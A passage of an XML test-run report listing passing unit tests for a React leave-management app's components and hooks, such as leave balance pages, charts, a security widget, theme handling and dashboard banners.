    <testcase classname="LeaveBalancesPage shows edit button for each employee" name="LeaveBalancesPage shows edit button for each employee" time="0.024">
    </testcase>
    <testcase classname="LeaveBalancesPage opens edit dialog when edit is clicked" name="LeaveBalancesPage opens edit dialog when edit is clicked" time="0.071">
    </testcase>
    <testcase classname="LeaveBalancesPage shows balance field labels on cards" name="LeaveBalancesPage shows balance field labels on cards" time="0.027">
    </testcase>
    <testcase classname="LeaveBalancesPage shows reason field in dialog" name="LeaveBalancesPage shows reason field in dialog" time="0.055">
    </testcase>
    <testcase classname="LeaveBalancesPage shows save and cancel buttons in dialog" name="LeaveBalancesPage shows save and cancel buttons in dialog" time="0.051">
    </testcase>
    <testcase classname="LeaveBalancesPage shows balance values on employee cards" name="LeaveBalancesPage shows balance values on employee cards" time="0.022">
    </testcase>
    <testcase classname="LeaveBalancesPage shows empty state when no employees" name="LeaveBalancesPage shows empty state when no employees" time="0.007">
    </testcase>
    <testcase classname="LeaveBalancesPage has search input" name="LeaveBalancesPage has search input" time="0.033">
    </testcase>
    <testcase classname="LeaveBalancesPage shows employee card with balance values" name="LeaveBalancesPage shows employee card with balance values" time="0.033">
    </testcase>
    <testcase classname="LeaveBalancesPage shows employee name in dialog title" name="LeaveBalancesPage shows employee name in dialog title" time="0.031">
    </testcase>
    <testcase classname="LeaveBalancesPage closes dialog on cancel" name="LeaveBalancesPage closes dialog on cancel" time="0.101">
    </testcase>
  </testsuite>
  <testsuite name="AuditLogDashboard" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:53" time="1.925" tests="8">
    <testcase classname="AuditLogDashboard renders without crashing" name="AuditLogDashboard renders without crashing" time="0.087">
    </testcase>
    <testcase classname="AuditLogDashboard renders title and subtitle" name="AuditLogDashboard renders title and subtitle" time="0.086">
    </testcase>
    <testcase classname="AuditLogDashboard renders stat card labels" name="AuditLogDashboard renders stat card labels" time="0.082">
    </testcase>
    <testcase classname="AuditLogDashboard renders search input" name="AuditLogDashboard renders search input" time="0.065">
    </testcase>
    <testcase classname="AuditLogDashboard filters logs by search query" name="AuditLogDashboard filters logs by search query" time="0.114">
    </testcase>
    <testcase classname="AuditLogDashboard shows empty state when no results" name="AuditLogDashboard shows empty state when no results" time="0.047">
    </testcase>
    <testcase classname="AuditLogDashboard shows timeline entries from real data" name="AuditLogDashboard shows timeline entries from real data" time="0.094">
    </testcase>
    <testcase classname="AuditLogDashboard shows IP addresses when present" name="AuditLogDashboard shows IP addresses when present" time="0.1">
    </testcase>
  </testsuite>
  <testsuite name="LeaveCharts" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:53" time="1.894" tests="22">
    <testcase classname="LeaveCharts renders without crashing with empty data" name="LeaveCharts renders without crashing with empty data" time="0.13">
    </testcase>
    <testcase classname="LeaveCharts renders monthly trend section title" name="LeaveCharts renders monthly trend section title" time="0.047">
    </testcase>
    <testcase classname="LeaveCharts renders leave distribution section title" name="LeaveCharts renders leave distribution section title" time="0.015">
    </testcase>
    <testcase classname="LeaveCharts renders bar chart with monthly data" name="LeaveCharts renders bar chart with monthly data" time="0.018">
    </testcase>
    <testcase classname="LeaveCharts renders pie chart when pieData is not empty" name="LeaveCharts renders pie chart when pieData is not empty" time="0.023">
    </testcase>
    <testcase classname="LeaveCharts renders pie cells for each pie entry" name="LeaveCharts renders pie cells for each pie entry" time="0.026">
    </testcase>
    <testcase classname="LeaveCharts shows empty state when pieData is empty" name="LeaveCharts shows empty state when pieData is empty" time="0.015">
    </testcase>
    <testcase classname="LeaveCharts shows calendar icon in empty state" name="LeaveCharts shows calendar icon in empty state" time="0.019">
    </testcase>
    <testcase classname="LeaveCharts does not show pie chart when pieData is empty" name="LeaveCharts does not show pie chart when pieData is empty" time="0.021">
    </testcase>
    <testcase classname="LeaveCharts renders responsive container for bar chart" name="LeaveCharts renders responsive container for bar chart" time="0.019">
    </testcase>
    <testcase classname="LeaveCharts renders bar chart with approved, pending, rejected bars" name="LeaveCharts renders bar chart with approved, pending, rejected bars" time="0.031">
    </testcase>
    <testcase classname="LeaveCharts handles single-entry monthlyTrend" name="LeaveCharts handles single-entry monthlyTrend" time="0.017">
    </testcase>
    <testcase classname="LeaveCharts handles large pieData entries" name="LeaveCharts handles large pieData entries" time="0.017">
    </testcase>
    <testcase classname="LeaveCharts renders card wrapper for each chart" name="LeaveCharts renders card wrapper for each chart" time="0.018">
    </testcase>
    <testcase classname="LeaveCharts renders trending up icon on monthly trend card" name="LeaveCharts renders trending up icon on monthly trend card" time="0.023">
    </testcase>
    <testcase classname="LeaveCharts renders with all zeros in monthly trend" name="LeaveCharts renders with all zeros in monthly trend" time="0.038">
    </testcase>
    <testcase classname="LeaveCharts renders with single pie entry" name="LeaveCharts renders with single pie entry" time="0.016">
    </testcase>
    <testcase classname="LeaveCharts renders dark theme tooltip styles" name="LeaveCharts renders dark theme tooltip styles" time="0.016">
    </testcase>
    <testcase classname="LeaveCharts renders card title with correct heading level" name="LeaveCharts renders card title with correct heading level" time="0.019">
    </testcase>
    <testcase classname="LeaveCharts renders x-axis and y-axis on bar chart" name="LeaveCharts renders x-axis and y-axis on bar chart" time="0.014">
    </testcase>
    <testcase classname="LeaveCharts renders cartesian grid on bar chart" name="LeaveCharts renders cartesian grid on bar chart" time="0.012">
    </testcase>
    <testcase classname="LeaveCharts renders legend on bar chart" name="LeaveCharts renders legend on bar chart" time="0.013">
    </testcase>
  </testsuite>
  <testsuite name="SecurityWidget" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:53" time="1.563" tests="15">
    <testcase classname="SecurityWidget renders security widget with stats" name="SecurityWidget renders security widget with stats" time="0.058">
    </testcase>
    <testcase classname="SecurityWidget renders total logins count" name="SecurityWidget renders total logins count" time="0.014">
    </testcase>
    <testcase classname="SecurityWidget renders failed logins count" name="SecurityWidget renders failed logins count" time="0.011">
    </testcase>
    <testcase classname="SecurityWidget renders high risk alerts count" name="SecurityWidget renders high risk alerts count" time="0.01">
    </testcase>
    <testcase classname="SecurityWidget shows elevated threat when highRisk &gt;= 3" name="SecurityWidget shows elevated threat when highRisk &gt;= 3" time="0.014">
    </testcase>
    <testcase classname="SecurityWidget shows elevated threat when highRisk is 5" name="SecurityWidget shows elevated threat when highRisk is 5" time="0.013">
    </testcase>
    <testcase classname="SecurityWidget shows critical threat when highRisk &gt;= 10" name="SecurityWidget shows critical threat when highRisk &gt;= 10" time="0.018">
    </testcase>
    <testcase classname="SecurityWidget shows critical threat when highRisk is 25" name="SecurityWidget shows critical threat when highRisk is 25" time="0.019">
    </testcase>
    <testcase classname="SecurityWidget shows moderate threat when failed &gt;= 20 and highRisk &lt; 3" name="SecurityWidget shows moderate threat when failed &gt;= 20 and highRisk &lt; 3" time="0.022">
    </testcase>
    <testcase classname="SecurityWidget links to /superadmin/security" name="SecurityWidget links to /superadmin/security" time="0.012">
    </testcase>
    <testcase classname="SecurityWidget link has group class for hover effect" name="SecurityWidget link has group class for hover effect" time="0.011">
    </testcase>
    <testcase classname="SecurityWidget handles undefined securityStats gracefully" name="SecurityWidget handles undefined securityStats gracefully" time="0.014">
    </testcase>
    <testcase classname="SecurityWidget handles zero values" name="SecurityWidget handles zero values" time="0.013">
    </testcase>
    <testcase classname="SecurityWidget renders ShieldCheck icon for normal threat" name="SecurityWidget renders ShieldCheck icon for normal threat" time="0.01">
    </testcase>
    <testcase classname="SecurityWidget renders ShieldAlert icon for elevated threat" name="SecurityWidget renders ShieldAlert icon for elevated threat" time="0.01">
    </testcase>
  </testsuite>
  <testsuite name="DashboardHeader" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:54" time="1.459" tests="11">
    <testcase classname="DashboardHeader renders dashboard title" name="DashboardHeader renders dashboard title" time="0.021">
    </testcase>
    <testcase classname="DashboardHeader renders org name in title when organization is selected" name="DashboardHeader renders org name in title when organization is selected" time="0.01">
    </testcase>
    <testcase classname="DashboardHeader renders formatted date" name="DashboardHeader renders formatted date" time="0.008">
    </testcase>
    <testcase classname="DashboardHeader renders calendar link" name="DashboardHeader renders calendar link" time="0.01">
    </testcase>
    <testcase classname="DashboardHeader renders new leave request button" name="DashboardHeader renders new leave request button" time="0.008">
    </testcase>
    <testcase classname="DashboardHeader shows superadmin buttons for superadmin role" name="DashboardHeader shows superadmin buttons for superadmin role" time="0.015">
    </testcase>
    <testcase classname="DashboardHeader does not show superadmin buttons for admin role" name="DashboardHeader does not show superadmin buttons for admin role" time="0.008">
    </testcase>
    <testcase classname="DashboardHeader does not show superadmin buttons for employee role" name="DashboardHeader does not show superadmin buttons for employee role" time="0.008">
    </testcase>
    <testcase classname="DashboardHeader superadmin buttons link to correct paths" name="DashboardHeader superadmin buttons link to correct paths" time="0.015">
    </testcase>
    <testcase classname="DashboardHeader renders title without org name when no org selected" name="DashboardHeader renders title without org name when no org selected" time="0.007">
    </testcase>
    <testcase classname="DashboardHeader renders when organization has no name" name="DashboardHeader renders when organization has no name" time="0.007">
    </testcase>
  </testsuite>
  <testsuite name="ErrorBoundary" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:54" time="1.974" tests="12">
    <testcase classname="ErrorBoundary renders children when no error occurs" name="ErrorBoundary renders children when no error occurs" time="0.012">
    </testcase>
    <testcase classname="ErrorBoundary renders fallback UI when error is caught" name="ErrorBoundary renders fallback UI when error is caught" time="0.129">
    </testcase>
    <testcase classname="ErrorBoundary calls onError callback when error is caught" name="ErrorBoundary calls onError callback when error is caught" time="0.028">
    </testcase>
    <testcase classname="ErrorBoundary sends error to Sentry when available" name="ErrorBoundary sends error to Sentry when available" time="0.024">
    </testcase>
    <testcase classname="ErrorBoundary uses custom fallback when provided" name="ErrorBoundary uses custom fallback when provided" time="0.004">
    </testcase>
    <testcase classname="ErrorBoundary shows error details in development mode" name="ErrorBoundary shows error details in development mode" time="0.051">
    </testcase>
    <testcase classname="ErrorBoundaryFallback renders error message" name="ErrorBoundaryFallback renders error message" time="0.01">
    </testcase>
    <testcase classname="ErrorBoundaryFallback calls resetError when Try Again is clicked" name="ErrorBoundaryFallback calls resetError when Try Again is clicked" time="0.011">
    </testcase>
    <testcase classname="WidgetErrorBoundary renders children when no error occurs" name="WidgetErrorBoundary renders children when no error occurs" time="0.003">
    </testcase>
    <testcase classname="WidgetErrorBoundary renders inline error UI when error is caught" name="WidgetErrorBoundary renders inline error UI when error is caught" time="0.041">
    </testcase>
    <testcase classname="WidgetErrorBoundary sends error to Sentry with widget tag" name="WidgetErrorBoundary sends error to Sentry with widget tag" time="0.015">
    </testcase>
    <testcase classname="WidgetErrorBoundary resets error state when Retry is clicked" name="WidgetErrorBoundary resets error state when Retry is clicked" time="0.018">
    </testcase>
  </testsuite>
  <testsuite name="RecentLeavesCard" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:55" time="1.163" tests="13">
    <testcase classname="RecentLeavesCard renders section title" name="RecentLeavesCard renders section title" time="0.025">
    </testcase>
    <testcase classname="RecentLeavesCard renders leave items with user names" name="RecentLeavesCard renders leave items with user names" time="0.015">
    </testcase>
    <testcase classname="RecentLeavesCard renders approved badge for approved leaves" name="RecentLeavesCard renders approved badge for approved leaves" time="0.012">
    </testcase>
    <testcase classname="RecentLeavesCard renders pending badge for pending leaves" name="RecentLeavesCard renders pending badge for pending leaves" time="0.011">
    </testcase>
    <testcase classname="RecentLeavesCard renders rejected badge for rejected leaves" name="RecentLeavesCard renders rejected badge for rejected leaves" time="0.012">
    </testcase>
    <testcase classname="RecentLeavesCard renders badges with correct status variants" name="RecentLeavesCard renders badges with correct status variants" time="0.024">
    </testcase>
    <testcase classname="RecentLeavesCard renders date range with formatted dates" name="RecentLeavesCard renders date range with formatted dates" time="0.011">
    </testcase>
    <testcase classname="RecentLeavesCard shows empty state when no leaves" name="RecentLeavesCard shows empty state when no leaves" time="0.01">
    </testcase>
    <testcase classname="RecentLeavesCard shows clock icon in empty state" name="RecentLeavesCard shows clock icon in empty state" time="0.007">
    </testcase>
    <testcase classname="RecentLeavesCard does not show leave items when empty" name="RecentLeavesCard does not show leave items when empty" time="0.007">
    </testcase>
    <testcase classname="RecentLeavesCard handles single leave" name="RecentLeavesCard handles single leave" time="0.009">
    </testcase>
    <testcase classname="RecentLeavesCard handles leaves with missing dates gracefully" name="RecentLeavesCard handles leaves with missing dates gracefully" time="0.007">
    </testcase>
    <testcase classname="RecentLeavesCard renders with empty string dates" name="RecentLeavesCard renders with empty string dates" time="0.008">
    </testcase>
  </testsuite>
  <testsuite name="ThemeProvider" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:54" time="1.69" tests="14">
    <testcase classname="ThemeProvider renders children" name="ThemeProvider renders children" time="0.017">
    </testcase>
    <testcase classname="ThemeProvider defaults to light theme (no stored preference)" name="ThemeProvider defaults to light theme (no stored preference)" time="0.01">
    </testcase>
    <testcase classname="ThemeProvider applies defaultTheme when provided" name="ThemeProvider applies defaultTheme when provided" time="0.012">
    </testcase>
    <testcase classname="ThemeProvider reads stored theme from localStorage" name="ThemeProvider reads stored theme from localStorage" time="0.016">
    </testcase>
    <testcase classname="ThemeProvider setTheme updates the theme via callback" name="ThemeProvider setTheme updates the theme via callback" time="0.029">
    </testcase>
    <testcase classname="ThemeProvider setTheme toggles back to light" name="ThemeProvider setTheme toggles back to light" time="0.011">
    </testcase>
    <testcase classname="ThemeProvider setTheme to system resolves to the system preference" name="ThemeProvider setTheme to system resolves to the system preference" time="0.01">
    </testcase>
    <testcase classname="ThemeProvider handles disableTransitionOnChange by adding style element" name="ThemeProvider handles disableTransitionOnChange by adding style element" time="0.017">
    </testcase>
    <testcase classname="ThemeProvider applies dark class to html element when dark theme is set" name="ThemeProvider applies dark class to html element when dark theme is set" time="0.007">
    </testcase>
    <testcase classname="ThemeProvider applies light class to html element when light theme set" name="ThemeProvider applies light class to html element when light theme set" time="0.01">
    </testcase>
    <testcase classname="ThemeProvider sets cookie when theme changes" name="ThemeProvider sets cookie when theme changes" time="0.007">
    </testcase>
    <testcase classname="ThemeProvider handles localStorage setItem throwing (storage unavailable)" name="ThemeProvider handles localStorage setItem throwing (storage unavailable)" time="0.009">
    </testcase>
    <testcase classname="ThemeProvider useTheme throws when used outside provider" name="ThemeProvider useTheme throws when used outside provider" time="0.159">
    </testcase>
    <testcase classname="useTheme hook returns theme, resolvedTheme and setTheme" name="useTheme hook returns theme, resolvedTheme and setTheme" time="0.01">
    </testcase>
  </testsuite>
  <testsuite name="useCurrency" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:54" time="1.559" tests="4">
    <testcase classname="useCurrency returns default state on first render with loading true" name="useCurrency returns default state on first render with loading true" time="0.088">
    </testcase>
    <testcase classname="useCurrency resolves with converted prices" name="useCurrency resolves with converted prices" time="0.08">
    </testcase>
    <testcase classname="useCurrency converts starter price correctly" name="useCurrency converts starter price correctly" time="0.094">
    </testcase>
    <testcase classname="useCurrency has loading false after resolving" name="useCurrency has loading false after resolving" time="0.073">
    </testcase>
  </testsuite>
  <testsuite name="ThemeSwitcher" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:55" time="1.464" tests="8">
    <testcase classname="ThemeSwitcher renders without crashing" name="ThemeSwitcher renders without crashing" time="0.029">
    </testcase>
    <testcase classname="ThemeSwitcher renders a button trigger" name="ThemeSwitcher renders a button trigger" time="0.016">
    </testcase>
    <testcase classname="ThemeSwitcher shows sun icon when resolvedTheme is light" name="ThemeSwitcher shows sun icon when resolvedTheme is light" time="0.017">
    </testcase>
    <testcase classname="ThemeSwitcher shows moon icon when resolvedTheme is dark" name="ThemeSwitcher shows moon icon when resolvedTheme is dark" time="0.018">
    </testcase>
    <testcase classname="ThemeSwitcher renders available themes (excluding current)" name="ThemeSwitcher renders available themes (excluding current)" time="0.011">
    </testcase>
    <testcase classname="ThemeSwitcher renders dropdown menu structure" name="ThemeSwitcher renders dropdown menu structure" time="0.014">
    </testcase>
    <testcase classname="ThemeSwitcher calls setTheme when clicking a theme option" name="ThemeSwitcher calls setTheme when clicking a theme option" time="0.014">
    </testcase>
    <testcase classname="ThemeSwitcher applies aria-label on the button" name="ThemeSwitcher applies aria-label on the button" time="0.01">
    </testcase>
  </testsuite>
  <testsuite name="useScrollDirection" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:55" time="1.417" tests="8">
    <testcase classname="useScrollDirection returns &quot;up&quot; initially because mount effect runs synchronously with scrollY=0 &lt;= threshold=64" name="useScrollDirection returns &quot;up&quot; initially because mount effect runs synchronously with scrollY=0 &lt;= threshold=64" time="0.01">
    </testcase>
    <testcase classname="useScrollDirection returns &quot;up&quot; when near top (scrollY &lt;= threshold)" name="useScrollDirection returns &quot;up&quot; when near top (scrollY &lt;= threshold)" time="0.004">
    </testcase>
    <testcase classname="useScrollDirection returns &quot;down&quot; when scrolling down past threshold" name="useScrollDirection returns &quot;down&quot; when scrolling down past threshold" time="0.005">
    </testcase>
    <testcase classname="useScrollDirection returns &quot;up&quot; when scrolling up with enough delta" name="useScrollDirection returns &quot;up&quot; when scrolling up with enough delta" time="0.004">
    </testcase>
    <testcase classname="useScrollDirection ignores small scroll changes (&lt; 5px delta)" name="useScrollDirection ignores small scroll changes (&lt; 5px delta)" time="0.005">
    </testcase>
    <testcase classname="useScrollDirection returns &quot;up&quot; for negative scrollY (rubber-band)" name="useScrollDirection returns &quot;up&quot; for negative scrollY (rubber-band)" time="0.005">
    </testcase>
    <testcase classname="useScrollDirection returns &quot;up&quot; when scrollY is 0" name="useScrollDirection returns &quot;up&quot; when scrollY is 0" time="0.004">
    </testcase>
    <testcase classname="useScrollDirection handles custom threshold value" name="useScrollDirection handles custom threshold value" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="useIdleTimer" errors="0" failures="0" skipped="1" timestamp="2026-07-28T12:22:55" time="1.3" tests="8">
    <testcase classname="useIdleTimer returns initial idle state" name="useIdleTimer returns initial idle state" time="0.012">
    </testcase>
    <testcase classname="useIdleTimer calls onIdle after idle timeout" name="useIdleTimer calls onIdle after idle timeout" time="0.008">
    </testcase>
    <testcase classname="useIdleTimer calls onLogout after idle + warning duration" name="useIdleTimer calls onLogout after idle + warning duration" time="0">
      <skipped/>
    </testcase>
    <testcase classname="useIdleTimer calls onActive after extendSession" name="useIdleTimer calls onActive after extendSession" time="0.007">
    </testcase>
    <testcase classname="useIdleTimer handleLogout calls onLogout immediately" name="useIdleTimer handleLogout calls onLogout immediately" time="0.005">
    </testcase>
    <testcase classname="useIdleTimer handleLogout sets isLoggedOut true" name="useIdleTimer handleLogout sets isLoggedOut true" time="0.005">
    </testcase>
    <testcase classname="useIdleTimer user activity resets idle timer" name="useIdleTimer user activity resets idle timer" time="0.008">
    </testcase>
    <testcase classname="useIdleTimer cleans up on unmount without throwing" name="useIdleTimer cleans up on unmount without throwing" time="0.005">
    </testcase>
  </testsuite>
  <testsuite name="useOfflineQueue" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.23" tests="8">
    <testcase classname="useOfflineQueue starts online with empty queue" name="useOfflineQueue starts online with empty queue" time="0.019">
    </testcase>
    <testcase classname="useOfflineQueue enqueue adds an item" name="useOfflineQueue enqueue adds an item" time="0.027">
    </testcase>
    <testcase classname="useOfflineQueue persists queue to localStorage" name="useOfflineQueue persists queue to localStorage" time="0.008">
    </testcase>
    <testcase classname="useOfflineQueue processes queue when back online" name="useOfflineQueue processes queue when back online" time="0.072">
    </testcase>
    <testcase classname="useOfflineQueue processes queue when items were enqueued offline" name="useOfflineQueue processes queue when items were enqueued offline" time="0.08">
    </testcase>
    <testcase classname="useOfflineQueue enqueue generates unique IDs" name="useOfflineQueue enqueue generates unique IDs" time="0.007">
    </testcase>
    <testcase classname="useOfflineQueue loads existing queue from localStorage on mount" name="useOfflineQueue loads existing queue from localStorage on mount" time="0.006">
    </testcase>
    <testcase classname="useOfflineQueue updates isOnline on offline event" name="useOfflineQueue updates isOnline on offline event" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="useVoiceNavigation" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.205" tests="11">
    <testcase classname="useVoiceNavigation starts listening when startListening is called" name="useVoiceNavigation starts listening when startListening is called" time="0.013">
    </testcase>
    <testcase classname="useVoiceNavigation sets isListening to true after start event" name="useVoiceNavigation sets isListening to true after start event" time="0.006">
    </testcase>
    <testcase classname="useVoiceNavigation sets isListening to false after error" name="useVoiceNavigation sets isListening to false after error" time="0.006">
    </testcase>
    <testcase classname="useVoiceNavigation sets isListening to false on end event" name="useVoiceNavigation sets isListening to false on end event" time="0.005">
    </testcase>
    <testcase classname="useVoiceNavigation navigates when intent is detected from voice command" name="useVoiceNavigation navigates when intent is detected from voice command" time="0.006">
    </testcase>
    <testcase classname="useVoiceNavigation provides voice feedback when speechSynthesis is available" name="useVoiceNavigation provides voice feedback when speechSynthesis is available" time="0.006">
    </testcase>
    <testcase classname="useVoiceNavigation stopListening stops recognition and updates state" name="useVoiceNavigation stopListening stops recognition and updates state" time="0.004">
    </testcase>
    <testcase classname="useVoiceNavigation does not start when enabled=false" name="useVoiceNavigation does not start when enabled=false" time="0.005">
    </testcase>
    <testcase classname="useVoiceNavigation does not navigate when no user" name="useVoiceNavigation does not navigate when no user" time="0.005">
    </testcase>
    <testcase classname="useVoiceNavigation sets transcript on voice command" name="useVoiceNavigation sets transcript on voice command" time="0.004">
    </testcase>
    <testcase classname="useVoiceNavigation cleans up recognition on unmount" name="useVoiceNavigation cleans up recognition on unmount" time="0.005">
    </testcase>
  </testsuite>
  <testsuite name="useSelectedOrganization" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.376" tests="5">
    <testcase classname="useSelectedOrganization returns selectedOrgId for superadmin after hydration" name="useSelectedOrganization returns selectedOrgId for superadmin after hydration" time="0.009">
    </testcase>
    <testcase classname="useSelectedOrganization returns null for superadmin with no selected org" name="useSelectedOrganization returns null for superadmin with no selected org" time="0.038">
    </testcase>
    <testcase classname="useSelectedOrganization returns user organizationId for non-superadmin" name="useSelectedOrganization returns user organizationId for non-superadmin" time="0.003">
    </testcase>
    <testcase classname="useSelectedOrganization returns user organizationId for employee" name="useSelectedOrganization returns user organizationId for employee" time="0.004">
    </testcase>
    <testcase classname="useSelectedOrganization returns null for user without organizationId" name="useSelectedOrganization returns null for user without organizationId" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="StatusUpdateContext" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.624" tests="15">
    <testcase classname="StatusUpdateContext provides default context values" name="StatusUpdateContext provides default context values" time="0.018">
    </testcase>
    <testcase classname="StatusUpdateContext showNotification updates the notification state" name="StatusUpdateContext showNotification updates the notification state" time="0.015">
    </testcase>
    <testcase classname="StatusUpdateContext hideNotification clears the notification" name="StatusUpdateContext hideNotification clears the notification" time="0.013">
    </testcase>
    <testcase classname="StatusUpdateContext showNotification includes timestamp" name="StatusUpdateContext showNotification includes timestamp" time="0.008">
    </testcase>
    <testcase classname="StatusUpdateContext useStatusUpdate throws when used outside provider" name="StatusUpdateContext useStatusUpdate throws when used outside provider" time="0.138">
    </testcase>
    <testcase classname="StatusUpdateContext supports multiple sequential notifications" name="StatusUpdateContext supports multiple sequential notifications" time="0.015">
    </testcase>
    <testcase classname="MarkdownMessage renders content passed as prop" name="MarkdownMessage renders content passed as prop" time="0.005">
    </testcase>
    <testcase classname="MarkdownMessage applies prose classes to wrapper div" name="MarkdownMessage applies prose classes to wrapper div" time="0.004">
    </testcase>
    <testcase classname="MarkdownMessage applies prose-invert class for user messages" name="MarkdownMessage applies prose-invert class for user messages" time="0.005">
    </testcase>
    <testcase classname="MarkdownMessage renders markdown content even with markdown syntax" name="MarkdownMessage renders markdown content even with markdown syntax" time="0.005">
    </testcase>
    <testcase classname="MarkdownMessage renders links markdown as raw text" name="MarkdownMessage renders links markdown as raw text" time="0.005">
    </testcase>
    <testcase classname="MarkdownMessage renders list markdown as raw text" name="MarkdownMessage renders list markdown as raw text" time="0.012">
    </testcase>
    <testcase classname="MarkdownMessage handles empty content gracefully" name="MarkdownMessage handles empty content gracefully" time="0.02">
    </testcase>
    <testcase classname="MarkdownMessage passes content directly to react-markdown" name="MarkdownMessage passes content directly to react-markdown" time="0.008">
    </testcase>
    <testcase classname="MarkdownMessage renders table markdown as raw text" name="MarkdownMessage renders table markdown as raw text" time="0.004">
    </testcase>
  </testsuite>
  <testsuite name="DashboardBanners" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.592" tests="18">
    <testcase classname="DashboardBanners returns null when no banners are active" name="DashboardBanners returns null when no banners are active" time="0.03">
    </testcase>
    <testcase classname="DashboardBanners shows login success banner when sessionStorage has just_logged_in" name="DashboardBanners shows login success banner when sessionStorage has just_logged_in" time="0.019">
    </testcase>
    <testcase classname="DashboardBanners removes just_logged_in flag from sessionStorage after showing" name="DashboardBanners removes just_logged_in flag from sessionStorage after showing" time="0.011">
    </testcase>
    <testcase classname="DashboardBanners shows suspicious login banner when sessionStorage has suspicious_login" name="DashboardBanners shows suspicious login banner when sessionStorage has suspicious_login" time="0.013">
    </testcase>
    <testcase classname="DashboardBanners removes suspicious_login from sessionStorage after showing" name="DashboardBanners removes suspicious_login from sessionStorage after showing" time="0.013">
    </testcase>
    <testcase classname="DashboardBanners renders review security action for suspicious login" name="DashboardBanners renders review security action for suspicious login" time="0.011">
    </testcase>
    <testcase classname="DashboardBanners shows session expiry banner when cookie is within 5 minutes" name="DashboardBanners shows session expiry banner when cookie is within 5 minutes" time="0.015">
    </testcase>
    <testcase classname="DashboardBanners shows extend session button when session is expiring" name="DashboardBanners shows extend session button when session is expiring" time="0.021">
    </testcase>
    <testcase classname="DashboardBanners shows welcome banner for new users (created within 24h)" name="DashboardBanners shows welcome banner for new users (created within 24h)" time="0.018">
    </testcase>
    <testcase classname="DashboardBanners does not show welcome banner for old users" name="DashboardBanners does not show welcome banner for old users" time="0.036">
    </testcase>
    <testcase classname="DashboardBanners persists welcome banner dismissal to localStorage" name="DashboardBanners persists welcome banner dismissal to localStorage" time="0.016">
    </testcase>
    <testcase classname="DashboardBanners shows leave warning when paid leave is low (&lt;= 2)" name="DashboardBanners shows leave warning when paid leave is low (&lt;= 2)" time="0.01">
    </testcase>
    <testcase classname="DashboardBanners shows leave warning when sick leave is low (&lt;= 2)" name="DashboardBanners shows leave warning when sick leave is low (&lt;= 2)" time="0.009">
    </testcase>
    <testcase classname="DashboardBanners shows leave warning when family leave is low (&lt;= 1)" name="DashboardBanners shows leave warning when family leave is low (&lt;= 1)" time="0.016">
    </testcase>
    <testcase classname="DashboardBanners does not show leave warning when balances are sufficient" name="DashboardBanners does not show leave warning when balances are sufficient" time="0.012">
    </testcase>
    <testcase classname="DashboardBanners shows view leave history action for leave warning" name="DashboardBanners shows view leave history action for leave warning" time="0.013">
    </testcase>
    <testcase classname="DashboardBanners renders multiple banners simultaneously" name="DashboardBanners renders multiple banners simultaneously" time="0.023">
    </testcase>
    <testcase classname="DashboardBanners renders SmartBanner components with correct types" name="DashboardBanners renders SmartBanner components with correct types" time="0.015">
    </testcase>
  </testsuite>
  <testsuite name="MotionDiv" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:56" time="1.539" tests="38">
    <testcase classname="MotionDiv renders children correctly" name="MotionDiv renders children correctly" time="0.022">
    </testcase>
    <testcase classname="MotionDiv applies className prop" name="MotionDiv applies className prop" time="0.006">
    </testcase>
    <testcase classname="MotionDiv renders as a div element by default" name="MotionDiv renders as a div element by default" time="0.005">
    </testcase>
    <testcase classname="MotionDiv applies layout class when layout prop is true" name="MotionDiv applies layout class when layout prop is true" time="0.037">
    </testcase>
    <testcase classname="MotionDiv handles onClick handler" name="MotionDiv handles onClick handler" time="0.005">
    </testcase>
    <testcase classname="MotionDiv applies animate style for opacity: 1" name="MotionDiv applies animate style for opacity: 1" time="0.003">
    </testcase>
    <testcase classname="MotionDiv applies animate style for translateX" name="MotionDiv applies animate style for translateX" time="0.004">
    </testcase>
    <testcase classname="MotionDiv applies animate style for translateY" name="MotionDiv applies animate style for translateY" time="0.006">
    </testcase>
    <testcase classname="MotionDiv applies animate scale class" name="MotionDiv applies animate scale class" time="0.005">
    </testcase>
    <testcase classname="MotionDiv applies initial opacity style" name="MotionDiv applies initial opacity style" time="0.003">
    </testcase>
    <testcase classname="MotionDiv uses variants objects for animate" name="MotionDiv uses variants objects for animate" time="0.003">
    </testcase>
    <testcase classname="MotionDiv uses variants objects for exit" name="MotionDiv uses variants objects for exit" time="0.005">
    </testcase>
    <testcase classname="MotionDiv passes additional HTML attributes via restProps" name="MotionDiv passes additional HTML attributes via restProps" time="0.009">
    </testcase>
    <testcase classname="MotionDiv applies transition duration as inline style" name="MotionDiv applies transition duration as inline style" time="0.005">
    </testcase>
    <testcase classname="MotionDiv applies transition delay as inline style" name="MotionDiv applies transition delay as inline style" time="0.005">
    </testcase>
    <testcase classname="MotionDiv handles whileHover scale" name="MotionDiv handles whileHover scale" time="0.006">
    </testcase>
    <testcase classname="MotionDiv handles whileTap scale" name="MotionDiv handles whileTap scale" time="0.006">
    </testcase>
    <testcase classname="MotionDiv handles number-based x and y transforms in animate" name="MotionDiv handles number-based x and y transforms in animate" time="0.005">
    </testcase>
    <testcase classname="MotionDiv handles string-based x transform in animate" name="MotionDiv handles string-based x transform in animate" time="0.005">
    </testcase>
    <testcase classname="MotionDiv handles width animation" name="MotionDiv handles width animation" time="0.005">
    </testcase>
    <testcase classname="MotionButton renders as a button element" name="MotionButton renders as a button element" time="0.003">
    </testcase>
    <testcase classname="MotionButton handles click events" name="MotionButton handles click events" time="0.005">
    </testcase>
